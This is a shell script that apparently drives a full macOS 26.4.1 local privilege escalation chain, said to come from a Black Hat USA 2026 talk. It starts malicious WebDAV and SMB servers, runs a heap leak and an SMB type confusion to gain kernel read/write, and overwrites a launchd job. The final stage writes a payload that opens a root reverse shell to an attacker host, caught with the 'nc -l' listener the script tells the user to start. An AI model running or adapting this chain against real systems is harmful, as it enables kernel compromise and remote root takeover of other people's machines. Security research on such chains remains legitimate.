#!/bin/sh
# run.sh -- victim-side orchestrator for the macOS 26.4.1 (25E253) LPE
# (Black Hat USA 2026, Blazakis/Calif: webdavfs stale-heap leak + smbfs
# RqLs create-context type confusion -> inpcb ICMP6_FILTER kernel R/W ->
# launchd job overwrite -> root reverse shell).
#
# Run ON THE VICTIM (macOS 26.4.1, t6050):
#
#     ./run.sh --lhost <attacker-ip> --lport 1337
#
# and on the attacker (or same machine for a local demo):
#
#     nc -l <attacker-ip> 1337        # reverse shell lands here as root
#
# Modes:
#   (default)      full chain: leak -> confusion -> kernel R/W -> root
#   --demo         PANIC DEMO ONLY: triggers the type confusion with
#                  K = 0x4141414141414141; the victim panics with the
#                  faulting address inside smb2_smb_parse_create_contexts.
#                  This PROVES the write primitive (and crashes the box).
#   --leak-only    run only the stage-0 webdav stale-heap leak PoC
#
# Everything is driven from this script; no other setup is needed.

set -u
cd "$(dirname "$0")"

# the spray needs ~8k sockets; default soft fd limit is 256
ulimit -n 10240 2>/dev/null || ulimit -n 4096 2>/dev/null || true

LHOST=127.0.0.1
LPORT=1337
MODE=full
WDAV_PORT=8080
SMB_PORT=1445
PAYLOAD=/tmp/lpe-root.sh          # MUST stay <= 18 chars (fits over
                                  # "/usr/bin/setregion" in launchd's heap)
WDAV_LOG=/tmp/lpe-webdav.log
SMB_LOG=/tmp/lpe-smb.log

usage() {
    echo "usage: $0 [--lhost IP] [--lport PORT] [--demo] [--leak-only]" >&2
    exit 2
}

while [ $# -gt 0 ]; do
    case "$1" in
        --lhost)     LHOST=$2; shift 2;;
        --lport)     LPORT=$2; shift 2;;
        --demo)      MODE=demo; shift;;
        --leak-only) MODE=leak; shift;;
        *)           usage;;
    esac
done

cleanup() {
    [ -n "${WDAV_PID:-}" ] && kill "$WDAV_PID" 2>/dev/null
    [ -n "${SMB_PID:-}" ] && kill "$SMB_PID" 2>/dev/null
    umount /tmp/lpe-webdav-mnt 2>/dev/null
    umount /tmp/lpe-smb-mnt 2>/dev/null
    true
}
trap cleanup EXIT

echo "=== [0] build ==="
make all || exit 1

echo "=== [1] starting malicious WebDAV server (127.0.0.1:$WDAV_PORT) ==="
python3 server/webdav_server.py --port "$WDAV_PORT" --body-len 0 \
    >"$WDAV_LOG" 2>&1 &
WDAV_PID=$!
sleep 1

echo "=== [2] starting malicious SMB server (127.0.0.1:$SMB_PORT) ==="
python3 server/smb_server.py --port "$SMB_PORT" --mode attack \
    >"$SMB_LOG" 2>&1 &
SMB_PID=$!
sleep 1

case "$MODE" in
leak)
    echo "=== [3] stage-0 leak PoC only ==="
    bin/leak --server "http://127.0.0.1:$WDAV_PORT" --spray ports \
        --count 512 --descs 16383
    exit $?
    ;;
demo)
    echo "=== [3] PANIC DEMO: confusion write at K=0x4141414141414141 ==="
    echo "    The victim will panic NOW; check the panic log for a fault"
    echo "    near 0x4141414141414151 in smb2_smb_parse_create_contexts."
    sleep 1
    bin/corrupt --server "//guest@127.0.0.1:$SMB_PORT/poc" \
        --ino 0x4141414141414141
    echo "[-] expected a panic; if you see this, the confusion did not fire" \
        "(check $SMB_LOG for the RESOLVE_ID exchange)"
    exit 1
    ;;
full)
    echo "=== [3] generating root payload $PAYLOAD (reverse shell to" \
        "$LHOST:$LPORT) ==="
    sed -e "s/__LHOST__/$LHOST/" -e "s/__LPORT__/$LPORT/" \
        payload.sh > "$PAYLOAD"
    chmod +x "$PAYLOAD"

    echo "    Make sure a listener is up:  nc -l $LHOST $LPORT"
    echo "=== [4] full chain: leak -> confuse -> kernel R/W -> root ==="
    bin/krw auto \
        --smb "//guest@127.0.0.1:$SMB_PORT/poc" \
        --webdav "http://127.0.0.1:$WDAV_PORT" \
        --root "$PAYLOAD"
    rc=$?
    if [ $rc -eq 0 ]; then
        echo "=== [5] done: /tmp/lpe-root-proof.txt written, reverse shell" \
            "on $LHOST:$LPORT ==="
    else
        echo "=== [5] exploit chain failed (rc=$rc); see $WDAV_LOG /" \
            "$SMB_LOG ==="
    fi
    exit $rc
    ;;
esac
